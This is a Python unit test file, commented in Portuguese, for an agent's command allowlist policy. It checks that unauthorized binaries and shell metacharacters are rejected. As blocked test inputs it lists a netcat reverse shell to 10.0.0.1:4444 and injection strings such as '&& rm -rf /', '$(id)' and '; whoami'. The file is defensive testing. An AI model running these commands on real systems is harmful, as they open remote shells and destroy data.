"""
Suíte de Testes da Política Centralizada de Segurança (CommandAllowlistPolicy)
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent.security.security_barrier_policy import CommandAllowlistPolicy


class TestCommandAllowlistPolicy(unittest.TestCase):
    """Valida a política de barreira de segurança centralizada."""

    def setUp(self):
        self.policy = CommandAllowlistPolicy(frozenset({"exiftool", "binwalk", "curl", "sudo", "base64"}))

    def test_valid_command_passes_validation(self):
        """Comandos com binários autorizados e argumentos limpos devem passar na validação."""
        ok, reason = self.policy.validate_command("exiftool", ["evidence.jpg"])
        self.assertTrue(ok)
        self.assertEqual(reason, "")

        ok_curl, _ = self.policy.validate_command("curl", ["-I", "http://example.com/robots.txt"])
        self.assertTrue(ok_curl)

    def test_unauthorized_binary_is_blocked(self):
        """Tentativas de usar binários fora da allowlist devem ser bloqueadas imediatamente."""
        ok_nc, reason = self.policy.validate_command("nc", ["-e", "/bin/sh", "10.0.0.1", "4444"])
        self.assertFalse(ok_nc)
        self.assertIn("BINÁRIO_NÃO_AUTORIZADO", reason)

        ok_bash, reason = self.policy.validate_command("bash", ["-c", "whoami"])
        self.assertFalse(ok_bash)
        self.assertIn("BINÁRIO_NÃO_AUTORIZADO", reason)

    def test_shell_metacharacters_in_arguments_are_blocked(self):
        """Argumentos contendo metacaracteres de shell (|, ;, &&, $, <, >, `, aspas) devem ser rejeitados."""
        dangerous_args = [
            "image.png; whoami",
            "file.bin | grep flag",
            "test.txt && rm -rf /",
            "$(id)",
            "`uname -a`",
            "file.png > out.txt",
            "< input.txt",
            "file'name",
            'file"name',
            "line1\nline2",
        ]
        for arg in dangerous_args:
            ok, reason = self.policy.validate_command("exiftool", [arg])
            self.assertFalse(ok, f"Argumento perigoso não foi bloqueado: {arg!r}")
            self.assertIn("METACARACTERE_DETECTADO", reason)


if __name__ == "__main__":
    unittest.main()
